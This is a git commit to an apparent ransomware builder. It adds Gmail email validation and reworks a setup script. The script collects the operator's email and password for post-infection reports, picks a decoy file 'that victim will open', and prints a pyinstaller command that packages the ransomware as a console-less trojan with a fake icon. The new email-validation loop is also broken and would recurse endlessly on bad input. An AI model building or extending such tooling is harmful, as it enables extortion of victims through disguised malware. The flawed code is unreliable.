c0a5fe20eacd9d2dc5ddd0e2b50a9e842219dafa
Damian <37978110+dszyszek@users.noreply.github.com>
2019-05-25 23:32:26 +0200

    Add email validation in /modules/validate_input.py; use it in setup.py

--- modules/validate_input.py
+++ modules/validate_input.py
@@ -1,9 +1,21 @@
 import tkinter
 from tkinter import messagebox
 import sys
+import re
 
 
 def validate_length(key_dec):
 
     if len(key_dec.split('.')) != 32:
         messagebox.showinfo('Error', 'Length of key is wrong!')
+
+
+def validate_email(email):
+    validate = re.search('.+@gmail.com', email)
+
+    try:
+        validate.group(0)
+        return True
+
+    except AttributeError:
+        return False
--- setup.py
+++ setup.py
@@ -3,6 +3,8 @@ from pyfiglet import figlet_format
 from termcolor import colored
 import json
 
+import modules.validate_input
+
 
 def setup_ransom():
     try:
@@ -21,12 +23,12 @@ def setup_ransom():
     print('I\'ll need some info about you at first.')
     print('1. What\'s the email address you want to use? (on this address report will be sent after program execution)')
     print('Remember - by default program use Google server to send email, so you have to use Google email')
-    email = input('Email address: ')
+
+    email = handle_email_validation()
+
     password = input('Password: ')
 
     fake_file_name = add_custom_file()
-    while not fake_file_name:   # to avoid quitting program while wrong file name
-        fake_file_name = add_custom_file(False)
 
     print('Ok, that\'s all for now. To run ransomware as trojan, type following command in main dir (pyinstaller required): ')
     print('pyinstaller ./ransom.py --add-data "<path to fake file (pdf, jpg)>;." --add-data "./img/frog.jpg;." --onefile --noconsole --icon "<path to icon of fake file>"')
@@ -43,23 +45,33 @@ def setup_ransom():
     print(f'\n[+] Created {file_name}.json file at ./user_info/\n')
 
 
-def add_custom_file(message=True):
-    if message:
-        print('There is an option to add custom fake file (the one that victim will open). Just pass name of the file (with extension; dont\'t forget to locate this file in /fake_file directory). If default kali.jpg is fine for you, just press enter')
-    else:
-        print('There is no such file!')
+def add_custom_file():
+    print('There is an option to add custom fake file (the one that victim will open). Just pass name of the file (with extension; dont\'t forget to locate this file in /fake_file directory before compiling). If default kali.jpg is fine for you, just press enter')
 
-    fake_file_name = input('2. Now write absolute path to fake file:\n')
+    fake_file_name = input('2. Name of fake file:\n')
 
-    if fake_file_name == '':
-        return 'kali.jpg'
+    while True:
+        if fake_file_name == '':
+            return 'kali.jpg'
 
-    try:
-        with open(f'./fake_file/{fake_file_name}') as input_file:   # to check if file exists
-            pass
-        return fake_file_name
-    except FileNotFoundError:
-        return False
+        try:
+            with open(f'./fake_file/{fake_file_name}') as input_file:   # to check if file exists
+                pass
+            return fake_file_name
+        except FileNotFoundError:
+            print(colored('There is no such file!', color='red'))
+            fake_file_name = input('2. Name of fake file:\n')
+
+
+def handle_email_validation():
+    email = input('Email address: ')
+    validation = modules.validate_input.validate_email(email)
+
+    while not validation:
+        print(colored('Email is wrong!', color='red'))
+        handle_email_validation()
+
+    return email
 
 
 if __name__ == '__main__':
